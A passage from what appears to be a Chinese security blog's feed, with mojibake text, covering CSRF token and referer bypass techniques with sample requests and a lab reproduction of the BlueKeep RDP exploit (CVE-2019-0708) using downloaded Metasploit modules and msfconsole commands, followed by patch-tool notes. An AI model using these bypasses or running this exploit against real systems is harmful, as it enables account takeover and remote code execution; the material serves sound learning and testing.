class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br><span class="line">å¯ä»¥è¢«æ”¹å†™æˆ</span><br><span class="line"></span><br><span class="line">GET /change_password?new_password=qwerty</span><br></pre></td></tr></table></figure><h2><span id="ä¸‰-csrf-tokençš„é˜²å¾¡æªæ–½">ä¸‰ ã€CSRF tokençš„é˜²å¾¡æªæ–½</span></h2><ul><li>å› ä¸ºä¸€ä¸ªç«™ç‚¹ä½¿ç”¨äº†CSRF tokenä¸ä»£è¡¨è¿™ä¸ªtokenæ˜¯æœ‰æ•ˆéªŒè¯å¯¹åº”è¯·æ±‚æ“ä½œçš„ï¼Œå¯ä»¥å°è¯•å¦‚ä¸‹æ–¹æ³•ç»•è¿‡CSRFçš„tokenä¿æŠ¤ã€‚</li></ul><h3><span id="31-åˆ é™¤tokenå‚æ•°æˆ–å‘é€ç©ºtoken">3.1 åˆ é™¤tokenå‚æ•°æˆ–å‘é€ç©ºtoken</span></h3><ul><li><p>ä¸å‘é€tokenä¹Ÿå¯ä»¥æ­£å¸¸è¯·æ±‚æ•°æ®æ˜¯å› ä¸ºè¿™ç§é€»è¾‘é”™è¯¯åœ¨åº”ç”¨ç¨‹åºä¸­éå¸¸å¸¸è§ï¼šåº”ç”¨ç¨‹åºæœ‰æ—¶ä¼šåœ¨tokenå­˜åœ¨çš„æ—¶å€™æˆ–è€…tokenå‚æ•°ä¸ä¸ºç©ºçš„æ—¶å€™æ£€æŸ¥tokençš„æœ‰æ•ˆæ€§ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœä¸€ä¸ªè¯·æ±‚ä¸åŒ…å«tokenæˆ–è€…tokenå€¼ä¸ºç©ºï¼Œé‚£ä¹ˆä¹Ÿæ˜¯æœ‰å¯èƒ½ç»•è¿‡CSRFçš„é˜²å¾¡çš„ã€‚</p></li><li><p>ä¾‹å¦‚ï¼Œåˆæ³•è¯·æ±‚å¦‚ä¸‹</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br><span class="line">é‚£ä¹ˆå®æ–½è¿™ç§è¯·æ±‚ï¼š</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty</span><br><span class="line">æˆ–è¿™ç§ï¼š</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty&amp;csrf_tok=</span><br></pre></td></tr></table></figure><h3><span id="32-ä½¿ç”¨å¦ä¸€ä¸ªsessionçš„csrf-token">3.2 ä½¿ç”¨å¦ä¸€ä¸ªsessionçš„CSRF token</span></h3><ul><li><p>åº”ç”¨ç¨‹åºå¯èƒ½åªæ˜¯æ£€æŸ¥tokenæ˜¯å¦åˆæ³•ï¼Œä½†æ˜¯ä¸æ£€æŸ¥tokenæ˜¯å¦ç¡®å®å½’å±äºå½“å‰ç”¨æˆ·ã€‚å¦‚æœæ˜¯è¿™ç§æƒ…å†µçš„è¯ï¼Œä½ å¯ä»¥åœ¨payloadä¸­ç¡¬ç¼–ç ä¸€ä¸ªåˆæ³•æœ‰æ•ˆçš„tokenå³å¯ã€‚</p></li><li><p>å¦‚æœä¸€ä¸ªå—å®³è€…çš„tokenæ˜¯871caef0757a4ac9691aceb9aad8b65bï¼Œä½ è‡ªå·±çš„tokenæ˜¯YOUR_TOKENï¼Œé‚£ä¹ˆä½ å¯ä»¥å¾ˆå®¹æ˜“è·å–åˆ°è‡ªå·±çš„tokenä½†å¾ˆéš¾è·å–åˆ°å—å®³è€…çš„tokenã€‚å°è¯•åœ¨payloadä¸­æä¾›è‡ªå·±çš„tokenæ¥ç»•è¿‡CSRFé˜²å¾¡ã€‚</p></li><li><p>æ¢å¥è¯è¯´ï¼ŒåŸæœ¬åº”è¯¥å‘é€å¦‚ä¸‹è¯·æ±‚ï¼š</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b</span><br><span class="line">ä½†æ˜¯æ”¹æˆå‘é€è¿™ä¸ªè¯·æ±‚ï¼š</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=YOUR_TOKEN</span><br></pre></td></tr></table></figure><h3><span id="33-sessionå›ºå®š">3.3 Sessionå›ºå®š</span></h3><ul><li><p>æœ‰æ—¶å€™ç«™ç‚¹ä½¿ç”¨ä¸€ä¸ªåŒæäº¤cookieä½œä¸ºä¸€ä¸ªCSRFçš„é˜²å¾¡æªæ–½ã€‚è¿™ä¸ªè¡¨æ˜è¿™ä¸ªè¯·æ±‚éœ€è¦åŒ…å«ä¸€ä¸ªcookieï¼Œå…¶å€¼ä¸ºéšæœºtokenå€¼ï¼Œä¸”åŒæ—¶åœ¨è¯·æ±‚å‚æ•°ä¸­ä¹Ÿæœ‰ä¸€ä¸ªå­—æ®µå€¼ä¸ºè¯¥éšæœºtokenå€¼ã€‚å¦‚æœå€¼ç›¸åŒï¼Œé‚£ä¹ˆè¯·æ±‚æ˜¯åˆæ³•çš„ã€‚è¿™ç§é˜²å¾¡å½¢å¼æ˜¯éå¸¸å¸¸è§çš„ã€‚</p></li><li><p>å¦‚æœä¸€ä¸ªåŒæäº¤cookieç”¨åœ¨äº†é˜²å¾¡æªæ–½ä¸­ï¼Œé‚£ä¹ˆè¿™ä¸ªåº”ç”¨æœ‰å¯èƒ½æ²¡æœ‰å°†æœ‰æ•ˆçš„tokenä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ã€‚æ‰€ä»¥å®ƒæ²¡æœ‰åŠæ³•æŒ‡å®štokenæ˜¯å¦åˆæ³•ï¼Œå¹¶ä¸”ä¹Ÿæœ‰å¯èƒ½å¾ˆå°‘æ£€æŸ¥cookieä¸­çš„tokenå€¼å’Œå‚æ•°ä¸­tokenå€¼æ˜¯ä¸æ˜¯ä¸€æ ·çš„ã€‚è¿™ä»£è¡¨ä½ å¯ä»¥å‘é€ä¸€ä¸ªå‡tokenï¼Œç„¶åä»ç„¶å¯ä»¥æœ‰æ•ˆå®æ–½CSRFæ”»å‡»ã€‚</p></li><li><p>è¿™ç§æ”»å‡»åŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼šç¬¬ä¸€æ­¥ï¼Œä½ ä½¿ç”¨ä¸€ä¸ªsessionå›ºå®šæŠ€æœ¯å»ç¡®è®¤å—å®³è€…çš„æµè§ˆå™¨ä½¿ç”¨çš„æ˜¯ä½ æä¾›çš„åŒ…å«å‡tokençš„sessionï¼Œç„¶åç¬¬äºŒæ­¥åœ¨å‚æ•°ä¸­ä½¿ç”¨åŒä¸€ä¸ªtokenæ¥æ‰§è¡Œè¿™ä¸ªCSRFæ”»å‡»ã€‚</p></li><li><p>sessionå›ºå®šã€‚è¿™æ˜¯ä¸€ä¸ªå¯ä»¥è®©ä½ æ§åˆ¶å—å®³è€…çš„cookieå­˜å‚¨çš„æ”»å‡»ï¼›</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ‰§è¡Œå¦‚ä¸‹è¯·æ±‚æ¥å®æ–½CSRFæ”»å‡»</span><br><span class="line"></span><br><span class="line">POST /change_password</span><br><span class="line">Cookie: CSRF_TOK=FAKE_TOKEN;</span><br><span class="line">POST body:</span><br><span class="line">new_password=qwerty &amp;csrf_tok=FAKE_TOKEN</span><br></pre></td></tr></table></figure><h3><span id="34-é€šè¿‡xssè·å–csrf_token">3.4 é€šè¿‡XSSè·å–csrf_token</span></h3><ul><li>å‰ææ˜¯ç½‘ç«™ä¸å­˜åœ¨XSSæ¼æ´æˆ–è€…CSRF-Tokenå…·å¤‡httponlyå±æ€§</li></ul><h3><span id="35-jsonpåŠ«æŒè·å–csrf_token">3.5 JsonpåŠ«æŒè·å–csrf_token</span></h3><ul><li><a href="https://www.jianshu.com/p/1cda296cf7d2" target="_blank" rel="noopener">https://www.jianshu.com/p/1cda296cf7d2</a></li></ul><h2><span id="å››-refererå­—æ®µçš„csrfé˜²å¾¡">å››ã€ Refererå­—æ®µçš„CSRFé˜²å¾¡</span></h2><ul><li>å¦‚æœattack.comæ˜¯ä¸€ä¸ªå¯æ§çš„åŸŸåï¼Œbank.comæ˜¯ä¸€ä¸ªè¦æ”»å‡»çš„åŸŸåã€‚è¿™ä¸ªç«™ç‚¹æ²¡æœ‰ä½¿ç”¨CSRF tokenä½†æ˜¯æ£€æŸ¥äº†refererå­—æ®µã€‚ä½ åº”è¯¥æ€ä¹ˆåšï¼Ÿ</li></ul><h3><span id="41-refererå€¼ä¸ºç©ºæˆ–ç§»é™¤refererå­—æ®µ">4.1 Refererå€¼ä¸ºç©ºæˆ–ç§»é™¤refererå­—æ®µ</span></h3><ul><li>é¦–å…ˆï¼Œæˆ‘ä»¬å¯¹ç©ºRefererçš„å®šä¹‰ä¸ºï¼ŒReferer å¤´éƒ¨çš„å†…å®¹ä¸ºç©ºï¼Œæˆ–è€…ï¼Œä¸€ä¸ªHTTPè¯·æ±‚ä¸­æ ¹æœ¬ä¸åŒ…å«Refererå¤´éƒ¨</li><li>å’Œå‘é€ä¸€ä¸ªç©ºtokenå€¼ç›¸åŒï¼Œæœ‰æ—¶å€™ä½ åªéœ€ç®€å•åœ°ç§»é™¤refererå­—æ®µå°±å¯ä»¥ç»•è¿‡CSRFé˜²å¾¡ã€‚ä½ å¯ä»¥æ·»åŠ å¦‚ä¸‹metaæ ‡ç­¾åˆ°å­˜åœ¨æ¼æ´çš„é¡µé¢ã€‚</li><li>æ‰©å±•æµ‹è¯•é¢ï¼šä¾‹å¦‚jsonpåŠ«æŒ</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">æˆ–</span><br><span class="line">&lt;meta name =&quot;referrer&quot; content =&quot;no-referrer&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>åº”ç”¨ç¨‹åºå¯èƒ½åªæ˜¯åœ¨å‘é€åæ‰ä¼šéªŒè¯ï¼Œè¿™ç§æƒ…å†µä¸‹ä½ å¯ä»¥ç»•è¿‡å…¶CSRFé˜²å¾¡ã€‚</li></ul><h3><span id="42-ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼">4.2 ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼</span></h3><ul><li><p>å¦‚æœrefereræ£€æŸ¥æ˜¯åŸºäºç™½åå•çš„ï¼Œä½ å¯ä»¥å°è¯•ç»•è¿‡éªŒè¯URLçš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥å°è¯•åœ¨refererçš„URLä¸­å°†å—å®³è€…åŸŸåç½®äºäºŒçº§åŸŸååŒºåŸŸæˆ–è€…URLç›®å½•åŒºåŸŸã€‚</p></li><li><p>å¦‚æœä¸€ä¸ªç«™ç‚¹åœ¨refererå­—æ®µæ£€æŸ¥â€œbank.comâ€å­—æ®µï¼Œé‚£ä¹ˆâ€œbank.com.attacker.comâ€æˆ–â€attakcer.com/bank.comâ€å¯èƒ½å¯ä»¥ç»•è¿‡è¿™ç§æ£€æµ‹ã€‚</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ä¸€-å…ˆäº†è§£ä¸‹csrf_token&quot;&gt;ä¸€ã€ å…ˆäº†è§£ä¸‹CSRF_TOKEN&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1-ä»€ä¹ˆæ˜¯csrf_token&quot;&gt;1. ä»€ä¹ˆæ˜¯CSRF_TOKEN&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a
      
    
    </summary>
    
    
      <category term="WEBå®‰å…¨" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="å‰ç«¯å®‰å…¨-CSRF" scheme="http://www.vkxss.top/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-CSRF/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708 è¿œç¨‹æ¡Œé¢ä»£ç æ‰§è¡Œæ¼æ´å¤ç°</title>
    <link href="http://www.vkxss.top/2019/09/07/CVE-2019-0708/"/>
    <id>http://www.vkxss.top/2019/09/07/CVE-2019-0708/</id>
    <published>2019-09-07T07:30:08.000Z</published>
    <updated>2019-09-20T02:01:32.249Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-ç®€ä»‹">0X00 ç®€ä»‹</a></li><li><a href="#0x01-ç¯å¢ƒå‡†å¤‡">0X01 ç¯å¢ƒå‡†å¤‡</a></li><li><a href="#0x02-æ¼æ´å¤ç°">0x02 æ¼æ´å¤ç°</a></li><li><a href="#0x03-æ¼æ´æ£€æµ‹ä¿®å¤å·¥å…·æ‰¹é‡å¿«é€Ÿæ‰«ææ£€æµ‹å·¥å…·çƒ­è¡¥ä¸å·¥å…·">0x03 æ¼æ´æ£€æµ‹ä¿®å¤å·¥å…·&amp;æ‰¹é‡å¿«é€Ÿæ‰«ææ£€æµ‹å·¥å…·&amp;çƒ­è¡¥ä¸å·¥å…·</a></li></ul><!-- tocstop --><h1><span id="0x00-ç®€ä»‹">0X00 ç®€ä»‹</span></h1><ul><li><p><font face="å¾®è½¯é›…é»‘">Microsoft Windowsæ˜¯ç¾å›½å¾®è½¯å…¬å¸å‘å¸ƒçš„è§†çª—æ“ä½œç³»ç»Ÿã€‚è¿œç¨‹æ¡Œé¢è¿æ¥æ˜¯å¾®è½¯ä»Windows 2000 Serverå¼€å§‹æä¾›çš„åŠŸèƒ½ç»„ä»¶ã€‚</font></p></li><li><p><font face="å¾®è½¯é›…é»‘">2019å¹´5æœˆ14æ—¥ï¼Œå¾®è½¯å‘å¸ƒäº†æœˆåº¦å®‰å…¨æ›´æ–°è¡¥ä¸ï¼Œä¿®å¤äº†è¿œç¨‹æ¡Œé¢åè®®ï¼ˆRDPï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œå‘ç›®æ ‡ Windowsä¸»æœºå‘é€æ¶æ„æ„é€ è¯·æ±‚ï¼Œå¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</font></p></li><li><p><font face="å¾®è½¯é›…é»‘">è¿‘æ—¥ï¼ŒMetasploitå‘å¸ƒäº†è¯¥æ¼æ´çš„åˆ©ç”¨æ¨¡å—ï¼ŒGitHubç½‘ç«™ä¸Šä¹Ÿå…¬å¼€äº†è¯¥æ¼æ´çš„åˆ©ç”¨ä»£ç ï¼Œå¼•èµ·äº†å®‰å…¨ç ”ç©¶äººå‘˜çš„å¹¿æ³›å…³æ³¨ã€‚ç›®å‰è¯¥æ¼æ´åˆ©ç”¨ä»…å¯¹Windows 7 SP1 x64ä¸Windows 2008 R2 x64ï¼ˆéç³»ç»Ÿé»˜è®¤é…ç½®ï¼‰ç³»ç»Ÿç‰ˆæœ¬æœ‰æ•ˆï¼Œåœ¨è™šæ‹Ÿæœºç¯å¢ƒä¸‹å¤ç°æˆåŠŸã€‚</font></p></li></ul><h1><span id="0x01-ç¯å¢ƒå‡†å¤‡">0X01 ç¯å¢ƒå‡†å¤‡</span></h1><ul><li><font face="å¾®è½¯é›…é»‘">æ”»å‡»æœº:kali</font></li><li><font face="å¾®è½¯é›…é»‘">é¶æœºï¼šWin7</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows7 SP1ä¸‹è½½é“¾æ¥</span><br><span class="line">ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/</span><br></pre></td></tr></table></figure><h1><span id="0x02-æ¼æ´å¤ç°">0x02 æ¼æ´å¤ç°</span></h1><ul><li><font face="å¾®è½¯é›…é»‘">msfå¿…é¡»ä½¿ç”¨msf5ï¼ˆ#msfupdateï¼‰</font></li><li><font face="å¾®è½¯é›…é»‘">ä¸‹è½½exp:<br><font face="å¾®è½¯é›…é»‘">kaliæ”»å‡»æœºä¸‹è½½metasploitæ”»å‡»è„šæœ¬ï¼Œkaliä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</font></font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br><span class="line">wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br></pre></td></tr></table></figure><p><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/Hf34b7902d9a74301be767557b04a35cdq.jpg" style="zoom:30%"></center><br><font face="å¾®è½¯é›…é»‘"><center>å›¾ï¼šä¸‹è½½æ”»å‡»è½½è·</center></font></font></p><ul><li><font face="å¾®è½¯é›…é»‘">åšå¦‚ä¸‹æ›¿æ¢ï¼ˆå¤§éƒ¨åˆ†äººmsféƒ½è£…åœ¨å¦‚ä¸‹ä½ç½®ï¼‰</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">rdp_scanner.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt; </span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">åšå¦‚ä¸‹æ›¿æ¢ï¼ˆæˆ‘çš„ä½ç½®ï¼‰</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rdp.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb</span><br><span class="line">rdp_scanner.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">cve_2019_0708_bluekeep.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">cve_2019_0708_bluekeep_rce.rb -&gt; </span><br><span class="line">/opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">reload_all é‡æ–°åŠ è½½æ‰€æœ‰çš„æ¨¡å—ï¼Œå°†æ–°æ·»åŠ çš„æ¨¡å—åŠ è½½ä¸Šã€‚æˆåŠŸå¦‚ä¸‹å›¾ï¼š</font></li></ul><p><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/Hc7c188bf9d2a4e88957191a666d72664d.jpg" style="zoom:30%"></center><br><font face="å¾®è½¯é›…é»‘"><center>å›¾ï¼šæˆåŠŸåŠ è½½æ”»å‡»è½½è·</center></font></font></p><ul><li><font face="å¾®è½¯é›…é»‘">ä½¿ç”¨æ”»å‡»è½½è·</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; use exploit/rdp/cve_2019_0708_bluekeep_rce</span><br><span class="line">&gt; set rhosts é¶æœºIP</span><br><span class="line">&gt; set target 3 ï¼ˆæ ¹æ®é¶æœºè€Œå®šï¼‰</span><br><span class="line">&gt; exploit</span><br></pre></td></tr></table></figure><p><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/Ha677c5104fc84a6d8274518d5564febfs.jpg" style="zoom:40%"></center></font></p><ul><li>æˆåŠŸåˆ©ç”¨ï¼ï¼ï¼ï¼</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; set target 3</span><br></pre></td></tr></table></figure><p><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H74b9edc3a44c4bdfbe94779a9cee8705Z.jpg" style="zoom:50%"></center><br><font face="å¾®è½¯é›…é»‘"><center>å›¾ï¼šè“å±</center></font></font></p><ul><li>å†æ¥ä¸€æ¬¡ï¼ï¼ï¼ï¼</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; set target 1</span><br></pre></td></tr></table></figure><p><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H274ef8c81712437ebfa26f2e12366427P.jpg" style="zoom:50%"></center><br><font face="å¾®è½¯é›…é»‘"><center>å›¾ï¼šä¼šè¯</center></font></font></p><h1><span id="0x03-æ¼æ´æ£€æµ‹ä¿®å¤å·¥å…·ampæ‰¹é‡å¿«é€Ÿæ‰«ææ£€æµ‹å·¥å…·ampçƒ­è¡¥ä¸å·¥å…·">0x03 æ¼æ´æ£€æµ‹ä¿®å¤å·¥å…·&amp;æ‰¹é‡å¿«é€Ÿæ‰«ææ£€æµ‹å·¥å…·&amp;çƒ­è¡¥ä¸å·¥å…·</span></h1><ul><li><font face="å¾®è½¯é›…é»‘">ä¸‹è½½é¡µé¢ï¼š</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.qianxin.com/other/CVE-2019-0708</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">ä½¿ç”¨è¯´æ˜ï¼š</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;ä¸‹è½½æ–‡ä»¶è¿›è¡Œè§£å‹ã€‚</span><br><span class="line">&gt;ä½¿ç”¨win+Rå¿«æ·é”®æˆ–å¼€å§‹èœå•é€‰æ‹©â€œè¿è¡Œâ€ï¼Œè¾“å…¥cmdã€‚è°ƒèµ·å‘½ä»¤è¡Œå·¥å…·ã€‚</span><br><span class="line">&gt;åœ¨å‘½ä»¤è¡Œå·¥å…·ï¼Œæ‰§è¡Œå‘½ä»¤åˆ°å·¥å…·æ‰€åœ¨æ–‡ä»¶å¤¹</span><br><span class="line">&gt;è¾“å…¥å‘½ä»¤å¯¹åº”åŠŸèƒ½ï¼Œå¯ç”¨çƒ­è¡¥ä¸å‘½ä»¤ï¼šQKShield.exe /enable ï¼›ç¦ç”¨çƒ­è¡¥ä¸å‘½ä»¤ï¼šQKShield.exe/disable ã€‚</span><br><span class="line">&gt;é‡å¯ç³»ç»Ÿåï¼Œéœ€è¦é‡æ–°è¿è¡Œå‘½ä»¤è¡Œæ¥å¯ç”¨çƒ­è¡¥ä¸</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">å®ç°æ•ˆæœï¼š</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">åœ¨å·¥å…·æ”¯æŒçš„ç³»ç»Ÿä¸­å¯ç”¨çƒ­è¡¥ä¸åï¼Œç”¨æ¼æ´æ‰«æå·¥å…·æ‰«æç»“æœä¸ºæ²¡æœ‰æ¼æ´ã€‚æ¼æ´æ‰«æå·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://www.qianxin.com/other/CVE-2019-0708</span><br><span class="line">æ”¯æŒç³»ç»Ÿï¼š</span><br><span class="line">Windows XP for 32-bit Systems Service Pack 3</span><br><span class="line">Windows 7 for 32-bit Systems</span><br><span class="line">Windows 7 for x64-based Systems</span><br><span class="line">Windows 7 for 32-bit Systems Service Pack 1</span><br><span class="line">Windows 7 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2003 for 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2003 R2 for 32-bit Systems Service Pack2</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack2 (Server Core installation)</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems ServicePack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems ServicePack 1 (Server Core installation)</span><br></pre></td></tr></table></figure><ul><li><font face="å¾®è½¯é›…é»‘">æš‚ä¸æ”¯æŒçš„ç³»ç»Ÿï¼š</font></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2003 for x64-based Systems Service Pack2</span><br><span class="line">Windows Server 2008 for Itanium-Based Systems ServicePack 2</span><br><span class="line">Windows Server 2008 R2 for Itanium-Based SystemsService Pack 1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-ç®€ä»‹&quot;&gt;0X00 ç®€ä»‹&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-ç¯å¢ƒå‡†å¤‡&quot;&gt;0X01 ç¯å¢ƒå‡†å¤‡&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-æ¼æ´å¤ç°&quot;&gt;0x02 æ¼æ´å¤ç°&lt;/a
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-0708" scheme="http://www.vkxss.top/tags/CVE-2019-0708/"/>
    
  </entry>
  
  <entry>
    <title>Insecure Randomness</title>
    <link href="http://www.vkxss.top/2019/08/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Insecure%20Randomness/"/>
    <id>http://www.vkxss.top/2019/08/22/ä»£ç å®¡è®¡-Insecure Randomness/</id>
    <published>2019-08-22T06:10:40.000Z</published>
    <updated>2019-09-20T02:01:37.919Z</updated>
    
